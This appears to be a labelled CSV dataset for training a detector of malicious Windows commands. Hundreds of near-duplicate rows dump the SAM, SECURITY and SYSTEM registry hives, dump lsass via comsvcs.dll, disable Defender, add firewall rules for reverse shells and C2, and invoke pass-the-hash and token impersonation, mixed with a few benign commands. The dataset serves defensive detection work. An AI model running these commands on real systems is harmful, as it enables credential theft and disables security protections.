text,label
"powershell -nop -c ""reg save hklm\security c:\temp\i1zb3qlv.dat""",1
reg save hklm\security c:\windows\temp\8pc94n0z.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8u895h2k.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s2fbq55a.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\p0q6y9mp.dat""",1
reg export hklm\system c:\windows\temp\kq40lrdl.save,1
set-mppreference -disablerealtimemonitoring $true,2
reg save hklm\security c:\windows\temp\l54ficmu.save,1
reg export hklm\sam c:\windows\temp\ect5m0xp.save,1
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\xi4j3y4x.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\2k1v3jlh.dat""",1
reg export hklm\security c:\windows\temp\71eyjy6r.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\h6rbvzz5.dat""",1
reg save hklm\security c:\windows\temp\15qckped.save,1
reg export hklm\sam c:\windows\temp\0w5kriq4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\p86lul9m.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\y4ebnb00.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\ez1sy19w.dat""""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\eosngon8.save""",1
reg save hklm\security c:\windows\temp\olrloa39.save,1
reg save hklm\sam c:\windows\temp\tzj8vmd0.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\f2imtcur.dat""",1
reg   export   hklm\sam   c:\windows\temp\4xcf1n88.save,1
"cmd.exe /c ""wmic   product   get   name,   version""",0
reg save hklm\sam c:\windows\temp\i17qs50f.save,1
reg export hklm\sam c:\windows\temp\tgp5h11m.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\pnccp32y.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\pw2269aw.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\fzxqmgg1.dat""",1
reg save hklm\system c:\windows\temp\wzekq6id.save,1
reg  export  hklm\system  c:\windows\temp\vxw2gq86.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\itmo6fl4.dat""",1
"powershell -nop -c ""ipconfig   /all""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\mj3yk0tq.dat""",1
reg  export  hklm\security  c:\windows\temp\h5891el4.save,1
reg  export  hklm\security  c:\windows\temp\4zp9094q.save,1
reg export hklm\sam c:\windows\temp\0kmdjjwo.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\2i4m9zsf.dat""",1
reg export hklm\sam c:\windows\temp\1angh56d.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\x2skmki4.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nfvdgfvu.dat""",1
reg export hklm\system c:\windows\temp\tnm88cqy.save,1
reg export hklm\system c:\windows\temp\qb0ajmaq.save,1
"cmd.exe /c ""sekurlsa::pth""",3
reg save hklm\system c:\windows\temp\y5m8tjg8.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1y4qxyde.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\45fclo86.dat""",1
rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg export hklm\security c:\windows\temp\j25rt74q.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gfs3plpk.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\kyt3o6h4.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\4oeelxif.dat""",1
reg export hklm\security c:\windows\temp\tnzuh1ox.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3xo34bcs.dat""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\806y3ayc.dat""",1
reg save hklm\security c:\windows\temp\on8zylcb.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\dqczyox3.dat""",1
reg save hklm\sam c:\windows\temp\p1b410zj.save,1
reg export hklm\system c:\windows\temp\ae4djczc.save,1
reg save hklm\sam c:\windows\temp\v2s26mid.save,1
reg export hklm\system c:\windows\temp\o2w17pt3.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\rgh51yee.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\n5689ahi.dat""",1
reg export hklm\system c:\windows\temp\jv4cf454.save,1
reg save hklm\security c:\windows\temp\5qbg59e8.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\45nv45n8.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\166da8se.dat""",1
"cmd.exe /c ""reg   query   hkcu\console""",0
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\afylvyav.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wl56uwc5.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\pue84v7v.dat""""",1
reg export hklm\sam c:\windows\temp\xta7ckbu.save,1
reg save hklm\sam c:\windows\temp\2suok6ib.save,1
"cmd.exe /c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\0i2wee7p.dat""",1
"rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full",1
"powershell -nop -c ""reg export hklm\security c:\temp\qaij6fpw.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\n41nhnu8.dat""",1
reg export hklm\system c:\windows\temp\5rlpvs4u.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\46tgviqr.dat""",1
reg export hklm\security c:\windows\temp\bbtko5zh.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\1ypdique.dat""",1
reg save hklm\security c:\windows\temp\tretti4t.save,1
reg save hklm\system c:\windows\temp\tyy9saz0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\i7c2qhrg.dat""",1
reg   export   hklm\system   c:\windows\temp\70qu7zpc.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"cmd.exe /c ""reg export hklm\sam c:\temp\hdz71ifl.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\s563rnfn.dat""",1
reg save hklm\security c:\windows\temp\tsut2pye.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\1vo9nniw.dat""""",1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\nqf4tvzp.dat""",1
reg save hklm\security c:\windows\temp\l9ln904n.save,1
reg save hklm\security c:\windows\temp\w3xu5d5z.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\e4h1ca5t.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\0ldlg6b7.dat""""",1
reg save hklm\system c:\windows\temp\79g1mt3e.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fbg13dh9.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\qnnjjrym.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\36e02szo.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\tq1yie1s.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ag8ve3jg.dat""",1
rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444,2
node   server.js   --port   3000,0
"powershell -nop -c ""reg export hklm\security c:\temp\o3oqlftm.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dday3g80.dat""",1
reg export hklm\system c:\windows\temp\mbkiz0mz.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\29kjeu8l.dat""""",1
reg export hklm\system c:\windows\temp\qyekzmnv.save,1
netsh   dump   >   netconfig.txt,0
"cmd.exe /c ""reg save hklm\security c:\temp\h55dhy9b.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\qfyxjosm.dat""",1
reg export hklm\system c:\windows\temp\ldr98vm1.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\ptt4h5pi.save""",1
reg save hklm\system c:\windows\temp\3wyq4ymg.save,1
reg save hklm\sam c:\windows\temp\ykq8isam.save,1
reg export hklm\sam c:\windows\temp\io4fg7sc.save,1
reg export hklm\sam c:\windows\temp\tngjj0gm.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1ujy2ct0.dat""",1
reg save hklm\system c:\windows\temp\l2vy3o00.save,1
reg export hklm\sam c:\windows\temp\68rqz25c.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\o2aut9kh.dat""",1
reg save hklm\system c:\windows\temp\c6ahle26.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\cp20mp0q.dat""",1
reg export hklm\security c:\windows\temp\x4y2dqzv.save,1
rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""ipconfig  /all""",0
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\pomh2mp1.dat""",1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"cmd.exe /c ""reg save hklm\security c:\temp\p1ndjegh.dat""",1
reg save hklm\security c:\windows\temp\bgi1maq8.save,1
reg save hklm\security c:\windows\temp\tx23h8ki.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3v7tnpau.dat""",1
reg export hklm\sam c:\windows\temp\uvc944iv.save,1
"powershell -nop -c ""ping   8.8.8.8""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\5bi0vm79.dat""",1
reg save hklm\system c:\windows\temp\pf261mkx.save,1
"cmd.exe /c ""backup-utility save registry config""",0
reg export hklm\security c:\windows\temp\etq5c3ih.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\1ofgrs9l.dat""",1
reg export hklm\security c:\windows\temp\9ltamdb8.save,1
reg save hklm\system c:\windows\temp\fvcxex9a.save,1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""sc stop windefend""",2
reg export hklm\security c:\windows\temp\zzh47l7r.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\8iwze31z.dat""",1
reg save hklm\system c:\windows\temp\6hnssmbw.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\vj5h8wc2.dat""",1
reg export hklm\sam c:\windows\temp\k1tyl21e.save,1
reg export hklm\security c:\windows\temp\c4u2rkbt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\vza2dylo.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\0ku07jcr.dat""",1
reg save hklm\system c:\windows\temp\1unf0yl6.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\oe69h89v.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\idiz1asv.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3l4qigb0.dat""",1
reg export hklm\system c:\windows\temp\4z5nn3yp.save,1
$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
reg export hklm\system c:\windows\temp\offydcgp.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\4nps12ad.dat""",1
reg export hklm\sam c:\windows\temp\576ut3hh.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\uz1yfl05.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\igimv6pr.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\oo1uszkr.dat""",1
select-string   -path   c:\logs\app.log   -pattern   'failed   logon',0
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\m0j96yuy.dat""",1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444,2
set-mppreference  -disablerealtimemonitoring  $true,2
reg  export  hklm\sam  c:\windows\temp\2vi68aas.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\x2fmchu9.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\16m8y7m6.dat""",1
reg export hklm\sam c:\windows\temp\k58ddeun.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\iiriqi1w.dat""",1
reg export hklm\sam c:\windows\temp\lpxfypk8.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\imydke57.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\k944l6ai.dat""""",1
reg save hklm\system c:\windows\temp\0l8nofcg.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\9f68mgxk.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\lmtr746p.dat""",1
reg save hklm\security c:\windows\temp\hbcyfj3s.save,1
reg export hklm\security c:\windows\temp\xaj7jupu.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\vkqfm8l2.dat""""",1
reg export hklm\security c:\windows\temp\xkhywk68.save,1
reg save hklm\sam c:\windows\temp\unvwan4l.save,1
reg save hklm\security c:\windows\temp\cr8n6uo0.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\k6f1w4lu.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wr8gv8dh.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\xqw7baba.dat""""",1
reg export hklm\security c:\windows\temp\68qj9rdb.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\8y1n8epf.save""",1
reg export hklm\sam c:\windows\temp\itn1s6o7.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\o4tb9tq7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\dp8rxyqn.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\up2zxqfl.dat""",1
reg export hklm\system c:\windows\temp\rfl1aivg.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\mlqn37as.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\f4fzrswn.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\8ougdd7z.dat""",1
reg export hklm\security c:\windows\temp\6lp3rdti.save,1
reg export hklm\system c:\windows\temp\h7e9some.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\c6oisiqy.dat""",1
"cmd.exe /c ""python   -m   http.server   8080""",0
"cmd.exe /c ""reg save hklm\sam c:\temp\642dq7nx.dat""",1
reg export hklm\system c:\windows\temp\0vfr4u2x.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ohf8vv5z.dat""",1
reg export hklm\security c:\windows\temp\08v70ckd.save,1
$a   =   [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
reg export hklm\security c:\windows\temp\cihceaxy.save,1
reg save hklm\security c:\windows\temp\59p5478f.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\5p6pd0nz.dat""",1
reg export hklm\security c:\windows\temp\f6vfvos7.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\7qu1zyev.save""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\moam8r3a.save""",1
reg save hklm\system c:\windows\temp\meysy5e7.save,1
reg  export  hklm\system  c:\windows\temp\ngk0ln8m.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\sfq4gzdx.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kstd4ipk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\vjtpn39h.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\hdg72hmg.dat""""",1
reg save hklm\security c:\windows\temp\wfq4hoqj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bmozuaqd.dat""",1
reg save hklm\sam c:\windows\temp\6th7dhx9.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ter1ptxm.dat""",1
"cmd.exe /c ""node   server.js   --port   3000""",0
"cmd.exe /c ""reg export hklm\system c:\windows\temp\xc16qtii.save""",1
reg  export  hklm\security  c:\windows\temp\e9a44nak.save,1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\security c:\windows\temp\9ayta1hu.save,1
backup-utility   save   registry   config,0
reg save hklm\sam c:\windows\temp\312iiyf0.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\xba0n4wc.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\lzgmr7wj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2bn8fzc3.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\bwdx3uqt.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\vst6mg2m.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\jmgidfkb.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\bw1gyz8p.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\doos1n1x.dat""",1
reg save hklm\system c:\windows\temp\79qu30xf.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\nf8rze28.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\lfvfhq4f.dat""",1
reg export hklm\system c:\windows\temp\14hxoz9g.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\13db8ene.dat""",1
reg export hklm\system c:\windows\temp\lg093b80.save,1
reg save hklm\security c:\windows\temp\rhw50pmm.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\r0hm5703.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\j1pxu4ye.dat""",1
reg save hklm\system c:\windows\temp\iqrhdbub.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\lc5lma8q.dat""",1
reg save hklm\sam c:\windows\temp\erisc8bp.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\b157cn2x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zpglwloe.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\khqmk26i.dat""",1
reg export hklm\system c:\windows\temp\u08b3044.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
"powershell -nop -c ""reg save hklm\security c:\temp\f62bv6lv.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\r7trqyik.dat""",1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\security c:\windows\temp\ikg31lga.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\0rznwt1m.dat""",1
reg export hklm\system c:\windows\temp\3fa6var5.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\jd8yua5q.dat""",1
reg save hklm\security c:\windows\temp\tol1awzk.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\6639poda.dat""",1
reg save hklm\sam c:\windows\temp\trxf1n2n.save,1
reg export hklm\system c:\windows\temp\8hyiv13n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\30rgrtp7.dat""",1
reg save hklm\security c:\windows\temp\6at1gqhl.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\p98nqit1.dat""",1
reg save hklm\sam c:\windows\temp\z62unump.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\306tezk2.dat""",1
reg   export   hklm\system   c:\windows\temp\xoz3nruc.save,1
reg save hklm\system c:\windows\temp\k6cy4m6c.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\nm25zay8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4woboj33.dat""",1
reg export hklm\system c:\windows\temp\1zknlr3i.save,1
reg export hklm\sam c:\windows\temp\bs12gwfj.save,1
reg save hklm\system c:\windows\temp\lca6kuv6.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\gqe75zkw.save""",1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\5zdw2p1i.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\gnaytr6i.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ke99dpny.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4amabedj.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hl1qb0j7.dat""",1
